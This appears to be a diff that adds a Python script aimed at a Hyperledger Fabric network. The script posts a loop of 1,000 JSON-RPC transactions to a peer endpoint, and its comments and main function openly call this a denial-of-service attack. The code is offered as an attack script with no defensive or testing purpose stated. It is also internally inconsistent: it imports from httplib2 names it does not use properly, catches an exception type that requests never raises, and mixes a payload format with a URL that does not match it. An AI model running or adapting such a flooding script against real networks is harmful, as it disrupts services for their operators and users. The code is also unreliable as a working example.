@@ -1,0 +1,54 @@
+import json
+import requests
+from httplib2 import HTTPConnection, HTTP
+from httplib2 import HttpLib2Error
+
+# Configuration
+FABRIC_URL = "http://localhost:7051"  # Replace with your Fabric network URL
+CHANNEL_ID = "mychannel"  # Replace with your channel ID
+CHAINCODE_ID = "mycc"  # Replace with your chaincode ID
+NUM_TRANSACTIONS = 1000  # Number of transactions to send
+
+# Function to create a transaction payload
+def create_transaction_payload(tx_id, value):
+    payload = {
+        "jsonrpc": "2.0",
+        "method": "execute",
+        "params": {
+            "type": 1,
+            "chaincodeID": {
+                "path": CHAINCODE_ID
+            },
+            "ctorMsg": {
+                "args": [value]
+            },
+            "secureContext": "User1"
+        },
+        "id": tx_id
+    }
+    return payload
+
+# Function to send a transaction to the Fabric network
+def send_transaction(tx_id, value):
+    url = f"{FABRIC_URL}/channels/{CHANNEL_ID}/chaincodes/{CHAINCODE_ID}"
+    headers = {'Content-Type': 'application/json'}
+    payload = create_transaction_payload(tx_id, value)
+
+    try:
+        response = requests.post(url, headers=headers, data=json.dumps(payload))
+        if response.status_code == 200:
+            print(f"Transaction {tx_id} sent successfully.")
+        else:
+            print(f"Failed to send transaction {tx_id}. Status code: {response.status_code}, Response: {response.text}")
+    except HttpLib2Error as e:
+        print(f"HTTP error occurred: {e}")
+
+# Main function to perform the DOS attack
+def dos_attack():
+    for i in range(NUM_TRANSACTIONS):
+        tx_id = f"tx_{i}"
+        value = f"value_{i}"
+        send_transaction(tx_id, value)
+
+if __name__ == "__main__":
+    dos_attack()
